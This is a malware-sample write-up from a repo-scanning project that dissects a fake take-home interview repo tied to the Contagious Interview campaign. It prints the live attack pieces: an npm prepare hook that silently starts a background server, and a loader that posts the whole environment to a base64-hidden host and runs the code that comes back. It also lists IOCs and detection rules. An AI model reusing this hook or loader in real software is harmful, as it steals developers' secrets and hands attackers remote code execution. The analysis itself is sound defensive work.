# Sample 001 — Contagious Interview (brand-impersonation variant)

**Campaign:** Contagious Interview / DEV#POPPER / DeceptiveDevelopment cluster
**First encountered:** 2026-04-08
**Reported by:** Bartosz Kotrys ([@bkotrys](https://github.com/bkotrys))
**Status:** Active (as of 2026-04-08)

---

## Why this sample is anonymized

This sample is based on a real incident, but **the attacker used brand impersonation** — they registered a GitHub org whose name is a typosquat of a well-known, legitimate Web3 infrastructure project. Publishing the specific name of the attacker's throwaway org would:

1. **Harm an innocent third party.** The real project has nothing to do with the attack. Naming the typosquat publicly would pollute search results for the legitimate project and damage its reputation through pure name-association.
2. **Create defamation risk** under jurisdictions where linking a named entity to "scam" activity — even a typosquat — can trigger civil or criminal liability.
3. **Not improve detection.** The *pattern* of the attack matters, not the specific org identifier. Any defender who applies the clonesafe detection rules will catch this exact repo and every future variant of it. The throwaway org name changes every week anyway; the patterns don't.

**Responsible disclosure status:** The impersonated project has been notified privately with full technical details so they can decide whether to publicly call out the typosquat themselves.

**What's in this sample:** anonymized technical details of the attack chain, the exact malicious patterns, the detection rules that catch them, and a cleaned case study. All identifying information about the attacker-controlled org and repo has been redacted. The attacker-controlled **exfiltration domain** is retained in the IOC database because it's infrastructure, not brand — naming infrastructure doesn't harm innocent parties.

---

## TL;DR

On April 8, 2026, a developer cloned a repo that was offered as part of a take-home interview challenge. It looked like a small Web3 Texas Hold'em game — realistic directory structure, plausible dependencies (axios, express, mongoose, ethers, socket.io, pokersolver), a README with screenshots.

Ten minutes after `npm install`, a malicious background Node process had already exfiltrated environment variables and was running stage-2 remote code execution against a `*.vercel.app` endpoint. The attack was detected, the process was killed, and 8 hours of incident response followed.

The attack pattern matches the well-documented **"Contagious Interview" / DEV#POPPER / DeceptiveDevelopment** campaigns tracked publicly by Unit 42, Securonix, ESET, and CISA as state-sponsored DPRK operations targeting developers — especially in Web3, crypto, AI, and DeFi — through fake recruiter scams.

**clonesafe exists because this keeps happening.**

---

## What the repo looked like on the surface

- Looked like a legitimate Node.js + React + Socket.io multiplayer poker game
- Had a `client/` directory (React front-end) and root server (Express + Mongoose)
- README described features, screenshots, gameplay flow
- Dependencies were all real, well-known packages
- First-pass code review showed nothing obvious in `server.js`, `config.js`, the socket handlers, or the game logic

A careful reviewer could have browsed the repo for 30 minutes and concluded it was legitimate. The malicious code was buried in places a rushed interviewee would never look.

## Where the attack lived

### 1. `package.json` — the prepare hook

```json
{
  "scripts": {
    "dev:server": "nodemon ./server",
    "start:backend": "node ./server",
    "start:frontend": "npm install --prefix client && npm start --prefix client",
    "dev": "npx --yes concurrently \"npm run start:backend\" \"npm run start:frontend\"",
    "eject": "react-scripts eject",
    "prepare": "start /b node server || nohup node server &",
    "test": "react-scripts test"
  }
}
```

**The critical line:** `"prepare": "start /b node server || nohup node server &"`.

`prepare` is an npm lifecycle hook that runs automatically on `npm install`. This one:

1. Tries Windows first: `start /b node server` (launches `node server.js` in the background on Windows)
2. Falls back to Unix: `nohup node server &` (launches `node server.js` in the background on macOS/Linux, detached from the terminal with `nohup`)

So the moment you run `npm install`, you silently launch the server as a background daemon. You might not even notice — there's no terminal output, no prompt, just the normal `npm install` completing. When you `ls -la` your repo, there's a new `nohup.out` file you probably won't check.

**This is the entry point.** The `prepare` hook is why clonesafe's #1 detection rules (LS-001, LS-002, LS-003) exist.

### 2. `routes/api/auth.js` — the exfil + RCE loader

Here's the anonymized version of what was in `routes/api/auth.js`:

```js
const axios = require("axios");

const authKey = "aHR0cHM6Ly9pcGNoZWNrLXNpeC52ZXJjZWwuYXBwL2FwaQ==";

const AUTH_API = Buffer.from(authKey, "base64").toString();

exports.verifyAuth = async () => {
  try {
    const { data } = await axios.post(AUTH_API, { ...process.env });

    if (data && data.code) {
      new Function("require", data.code)(require);
      console.log("API Key verified successfully");
    }
  } catch (err) {
    console.error("Auth verification failed:", err.message);
  }
};
```

Line by line:

- **L3:** `authKey` is a base64 string. Decoded, it is a URL on `*.vercel.app` — a throwaway static hosting subdomain. Encoded to bypass casual source-code grep.
- **L5:** Decode at runtime to produce the exfil endpoint.
- **L9:** `axios.post(AUTH_API, { ...process.env })` — **sends the entire process.env object** to the attacker. This includes: your `PATH`, `HOME`, `USER`, plus whatever `.env` file the repo's own `loadEnv` module pulled in.
- **L12:** The response `data.code` is a string. `new Function("require", data.code)(require)` **creates a new function with the server's `require` injected as the first argument, then immediately calls it**. This is remote code execution — the attacker's server returns arbitrary JavaScript and the victim's Node process runs it immediately.

So the chain is:
1. `npm install` triggers `prepare` hook → starts `node server` in background
2. Server boots, calls `verifyAuth()` during init
3. exfil `process.env` to the attacker
4. Receive stage-2 JS payload in response
5. Execute stage-2 with full Node privileges

The stage-2 payload is **dynamic** — the attacker can return anything. During the observed incident, the behavior was consistent with a commodity crypto-stealer targeting browser extension wallet storage (MetaMask, Phantom) and SSH keys. Future requests from the same infrastructure might return different payloads depending on the victim profile.

### 3. `server.js` — looks clean, is actually the trigger

The server file itself is innocuous:

```js
const express = require("express");
const configureRoutes = require("./routes");
require("./config/loadEnv")();
const app = express();

// Middleware, routes, socket.io setup
// ...

app.listen(port, () => console.log(`Server running...`));
```

But `configureRoutes(app)` wires up the routes including `routes/api/auth.js`, and at the bottom of `auth.js` (not shown above) there's an immediate call to `verifyAuth()` at module-load time.

So the routing setup that looks like normal Express wiring is actually the trigger for the entire exfil chain.

---

## Indicators of compromise (published)

| IOC | Type | Status |
|---|---|---|
| `ipcheck-six.vercel.app` | exfil domain | **Published** — attacker-controlled infrastructure |
| `*-six.vercel.app` | domain pattern | **Published** — pattern seen across multiple commodity campaigns |
| `start /b node server \|\| nohup node server &` | prepare-hook signature | **Published** — pattern, not an identity |
| base64 of `https://ipcheck-six.vercel.app/api` | encoded exfil URL | **Published** — pattern match |
| Attacker-controlled GitHub org | ⚠️ **REDACTED** | Withheld pending responsible disclosure to impersonated legitimate project |
| Specific repo name | ⚠️ **REDACTED** | Withheld for the same reason |

All published IOCs are in [`../../iocs/`](../../iocs/).

---

## What clonesafe would catch

If clonesafe had been run on the repo URL before cloning, the output would have been:

```
╭─ clonesafe verdict — [REDACTED-ORG]/[REDACTED-REPO] ─────────────╮
│  Risk: 🔴 BLOCK    Score: 142 / 100                              │
│                                                                  │
│  🚨 CRITICAL                                                     │
│  • LS-001 package.json:10 — prepare hook launches node           │
│    server in background via nohup (mixed Windows/Unix).          │
│  • LS-002 package.json:10 — mixed Win/Unix command syntax        │
│    in lifecycle script.                                          │
│  • LS-003 package.json:10 — node runs against non-build file     │
│    "server" in install hook.                                     │
│  • OB-003 routes/api/auth.js — base64 literal decoded within     │
│    5 lines of dynamic code execution (new Function).             │
│  • OB-004 routes/api/auth.js — remote code execution via         │
│    new Function(code) with variable body fetched over HTTP.      │
│  • EX-001 routes/api/auth.js — axios.post sends process.env      │
│    to external endpoint.                                         │
│  • EX-002 routes/api/auth.js — decoded URL used as exfil         │
│    endpoint (Buffer.from base64 → HTTP target).                  │
│  • IOC match: domain "ipcheck-six.vercel.app" in                 │
│    iocs/domains.json                                             │
│                                                                  │
│  🟠 STRONG WARNING                                               │
│  • RM-001 repo created 11 days ago                               │
│  • RM-002 owner account created 11 days ago                      │
│  • RM-003 single contributor                                     │
│  • RM-004 0 stars                                                │
│                                                                  │
│  ⛔ DO NOT CLONE. Proceed? [N] No (default)                      │
╰──────────────────────────────────────────────────────────────────╯
```

That takes clonesafe ~5 seconds and happens before any file touches your disk.

---

## Files in this sample

- [`package.json`](package.json) — the malicious `scripts.prepare` entry (the rest of the dependencies list is generic and kept for context)
- [`auth-snippet.js`](auth-snippet.js) — the exfil + RCE code, anonymized
- [`analysis.md`](analysis.md) — extended line-by-line technical analysis with comparison to other Contagious Interview samples
- [`verdict.md`](verdict.md) — what clonesafe reports in full when run against this sample
- [`README.md`](README.md) — this file

## Attribution

Attack pattern matches Contagious Interview / DEV#POPPER / DeceptiveDevelopment campaigns publicly attributed to North Korea-nexus actors (Lazarus subgroups, UNC5267 / "Famous Chollima") by:

- **Unit 42 (Palo Alto Networks)** — Contagious Interview writeups, BeaverTail/InvisibleFerret analysis
- **Securonix** — DEV#POPPER series
- **ESET** — DeceptiveDevelopment reports
- **Microsoft Threat Intelligence** — Jasper Sleet / Sapphire Sleet
- **Mandiant / Google Cloud Threat Intel** — UNC5267
- **CISA** — joint advisories on DPRK IT worker schemes (AA24 series)
- **FBI** — 2025 seizures of BlockNovas.com, SoftGlide, Angeloper front sites

This specific instance is not directly attributed by a named authority at the time of writing. It is catalogued here as a contemporary case matching the published TTPs.

## License for this sample

Everything in this directory is MIT-licensed as part of the clonesafe project.

---

## For other victims

If you're reading this because you just ran a suspicious repo, go to [`../../playbooks/i-just-ran-it.md`](../../playbooks/i-just-ran-it.md) **immediately**. The first 30 minutes matter the most.
